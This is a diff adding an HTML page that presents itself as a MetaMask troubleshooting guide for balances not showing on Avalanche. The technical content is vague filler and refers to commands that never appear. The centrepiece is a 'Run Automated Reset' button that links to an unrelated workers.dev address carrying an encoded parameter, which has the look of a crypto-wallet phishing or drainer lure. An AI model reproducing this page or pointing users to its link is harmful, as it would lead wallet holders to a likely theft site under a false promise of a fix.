@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Asset Balance Not Displayed On Avalanche</title>
+<style>
+    body {
+        font-family: sans-serif;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff7b2c; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>The user is unable to view their asset balance on the Avalanche network when using the Metamask extension, despite having a positive balance.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Avalanche network, resulting in the extension failing to fetch and display the asset balance.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Attempt to reset the Metamask extension by clearing its storage and restarting the browser.</li>
+<li>Manually add the Avalanche network to the Metamask extension using the following configuration:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">43114</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Avalanche&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;nativeCurrency&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Avalanche&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AVAX&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;rpcUrls&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://api.avax.network/ext/bc/C/rpc&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;blockExplorerUrls&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://cchain.explorer.avax.network&quot;</span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>Try updating the Metamask extension to the latest version.</li>
+</ul>
+<p>You may want to try these commands in a separate terminal for more control.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured on the browser.</li>
+<li>Avalanche network added to the Metamask extension.</li>
+<li>A positive asset balance on the Avalanche network.</li>
+</ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=dHJvbg==" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
